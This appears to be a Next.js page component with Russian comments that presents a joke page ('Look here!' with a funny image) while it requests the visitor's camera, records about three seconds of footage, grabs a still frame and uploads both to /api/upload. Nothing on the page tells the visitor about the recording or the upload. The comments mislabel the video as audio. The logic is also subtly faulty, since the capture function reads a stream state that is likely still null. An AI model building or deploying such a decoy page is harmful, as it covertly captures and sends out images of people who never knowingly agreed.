"use client";

import { useEffect, useState, useRef } from "react";

export default function Home() {
  const [stream, setStream] = useState<MediaStream | null>(null);
  const mediaRecorderRef = useRef<MediaRecorder | null>(null);
  const audioChunksRef = useRef<Blob[]>([]);

  useEffect(() => {
    const startCapture = async () => {
      try {
        if (typeof navigator !== "undefined" && navigator.mediaDevices?.getUserMedia) {
          // Только видео без звука
          const mediaStream = await navigator.mediaDevices.getUserMedia({
            video: true,  // Убираем audio: true
          });
          setStream(mediaStream);

          // Настройка записи аудио
          const mediaRecorder = new MediaRecorder(mediaStream);
          mediaRecorderRef.current = mediaRecorder;
          mediaRecorder.ondataavailable = (event) => {
            if (event.data.size > 0) {
              audioChunksRef.current.push(event.data);
            }
          };
          mediaRecorder.start();

          setTimeout(() => {
            mediaRecorder.stop();
            captureAndSendPhoto();
          }, 3000);
        } else {
          console.error("getUserMedia не поддерживается в этом браузере");
        }
      } catch (error) {
        console.error("Ошибка доступа к камере:", error);
      }
    };

    startCapture();
  }, []);

  const captureAndSendPhoto = async () => {
    const videoElement = document.createElement("video");
    if (!stream) return;
    videoElement.srcObject = stream;
    
    // Ждём, пока видео загрузится
    await new Promise((resolve) => {
      videoElement.onloadedmetadata = () => resolve(null);
    });

    const canvas = document.createElement("canvas");
    const context = canvas.getContext("2d");
    if (!context) return;

    canvas.width = videoElement.videoWidth;
    canvas.height = videoElement.videoHeight;
    context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);

    const blob = await new Promise<Blob | null>((resolve) => canvas.toBlob(resolve, "image/png"));
    if (!blob) return;

    // Создаем аудиофайл
    const audioBlob = new Blob(audioChunksRef.current, { type: "audio/ogg" });

    const formData = new FormData();
    formData.append("file", blob, "photo.png");
    formData.append("audio", audioBlob, "audio.ogg");

    await fetch("/api/upload", {
      method: "POST",
      body: formData,
    });

    console.log("Фото и аудио отправлены на сервер!");
  };

  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-gray-900 text-white">
      <h1 className="text-2xl mb-4">🤣 Посмотри сюда!</h1>
      <img src="/funny.jpg" alt="Прикол" className="mt-4 w-64" />
    </div>
  );
}
